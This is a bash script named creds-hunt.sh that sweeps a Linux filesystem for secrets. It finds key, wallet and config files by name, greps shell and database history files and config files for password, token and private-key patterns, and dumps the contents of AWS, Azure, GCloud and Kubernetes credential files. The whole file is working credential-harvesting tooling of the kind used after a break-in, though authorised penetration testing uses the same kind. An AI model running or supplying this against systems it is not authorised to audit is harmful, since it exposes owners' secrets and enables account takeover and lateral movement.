#!/usr/bin/env bash
# creds-hunt.sh — grep the filesystem for credentials.
# Conservative — limits search to common paths to avoid hours of I/O.
set -u

PATHS="/etc /opt /var/www /home /root /tmp /srv /usr/local /var/log"
PATTERNS='pass(word|wd)\s*[=:]|secret\s*[=:]|api[_-]?key\s*[=:]|token\s*[=:]|aws_access_key|aws_secret|connectionstring|bearer\s+[a-z0-9]|BEGIN.*PRIVATE KEY'

echo "=== High-value files by name ==="
find $PATHS -xdev -type f \( \
    -name '*.env'      -o -name '.env'        -o -name '.env.*'        -o \
    -name 'web.config' -o -name 'app.config'  -o -name 'application*'  -o \
    -name '*.kdbx'     -o -name 'wp-config.php' -o -name 'configuration.php' -o \
    -name '*.pem'      -o -name '*.ppk'       -o -name 'id_rsa*'       -o \
    -name 'credentials' -o -name 'creds*'     -o -name '.npmrc'        -o \
    -name '.netrc'     -o -name '.aws'        -o -name 'config.json'   \
    \) 2>/dev/null | head -100

echo
echo "=== History files ==="
for u in /root /home/*; do
    for h in .bash_history .zsh_history .mysql_history .psql_history .python_history; do
        f="$u/$h"
        [ -r "$f" ] || continue
        out=$(grep -EiI "$PATTERNS" "$f" 2>/dev/null | head -5)
        [ -n "$out" ] && { echo "--- $f ---"; echo "$out"; }
    done
done

echo
echo "=== Greppable text files in $PATHS (top 200 hits) ==="
grep -rEiI "$PATTERNS" $PATHS \
    --include='*.txt' --include='*.conf' --include='*.cnf' \
    --include='*.config' --include='*.json' --include='*.yml' --include='*.yaml' \
    --include='*.ini' --include='*.xml' --include='*.env' --include='*.properties' \
    --include='*.sh' --include='*.py' --include='*.rb' --include='*.js' --include='*.php' \
    2>/dev/null | head -200

echo
echo "=== Cloud-provider credentials ==="
for f in ~/.aws/credentials ~/.aws/config /root/.aws/credentials /root/.aws/config \
         ~/.azure/credentials /root/.azure/credentials \
         ~/.config/gcloud/credentials.db /root/.config/gcloud/credentials.db; do
    [ -r "$f" ] && { echo "[+] $f"; head -10 "$f"; }
done

echo
echo "=== Kubernetes contexts ==="
for f in ~/.kube/config /root/.kube/config /var/lib/kubelet/kubeconfig; do
    [ -r "$f" ] && { echo "[+] $f"; head -20 "$f"; }
done
